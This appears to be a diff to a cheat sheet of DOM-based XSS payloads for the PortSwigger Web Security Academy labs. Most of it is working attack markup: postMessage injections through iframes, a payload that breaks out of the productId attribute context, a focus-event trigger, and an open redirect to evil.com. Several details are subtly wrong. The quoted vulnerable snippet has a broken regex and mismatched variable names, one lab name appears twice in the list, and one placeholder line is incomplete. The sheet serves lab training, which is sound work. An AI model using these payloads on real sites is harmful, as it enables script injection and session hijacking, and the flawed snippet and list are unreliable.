@@ -1,7 +1,43 @@
+# PortSwigger WEB SECURITY ACADEMY -> DOM XSS LAB CHEAT SHEET
+# Use YOUR-LAB-ID in place of web-security-academy.net (replace per lab).
+
+# ---- 1. web message (missing origin check / shortcut sink) ----
 <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
-<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
-<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
-<form id=x tabindex=0 onfocus=print()><input id=attributes>
-<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
-<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+# ---- 2. open redirect -> DOM (vulnerable snippet the labs use) ----
+<a href='#' onclick='returnURL = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+#   attack:  /?url=https://evil.com
+
+# ---- 3. innerHTML / productId context (page reload trick so the sink sees the param) ----
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
+
+# ---- 4. focus sink (tabindex/onfocus/autofocus) ----
+<form id=x tabindex=0 onfocus=print()><input id=attributes>
+#   autofocus variant:  <iframe src=LAB onload="this.src='LAB/?#...'"> hand-off
+
+# ---- 5. hash/location re-render (setTimeout re-set src) ----
+<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
+
+# ---- 6. document.write(location.search) / eval / setTimeout / jQuery / Angular / clobber / PP : see
+#   dom-based-vulnerabilities-2026-ultimate.txt sections 1-12 for the same patterns + payloads.
+#   swap the URL/hash/q to the LAB, use print() as the benign proof instead of alert().
+
+# ---- quick lab list (run order) ----
+# 1  DOM XSS in document.write sink using location.search
+# 2  DOM XSS in innerHTML sink using location.search
+# 3  DOM XSS using web messages
+# 4  DOM XSS using web messages + a JavaScript URL
+# 5  DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+# 6  DOM XSS in jQuery anchor href attribute sink using location.search
+# 7  DOM XSS in jQuery selector sink using a hashchange event
+# 8  DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+# 9  DOM XSS in document.write sink using location.search inside a select element
+# 10 DOM XSS in document.write sink using location.search inside a select (adv)
+# 11 DOM XSS in innerHTML sink using location.search (with some sanitization)
+# 12 DOM XSS in dom clobbering (form/input config)
+# 13 DOM XSS in prototype pollution (__proto__ via hash -> sink property)
+# 14 DOM XSS in web message -> blind (send to collab, not alert)
+
+# Use Burp DOM Invader (added to your toolkit) - it auto-highlights sinks + generates payloads.
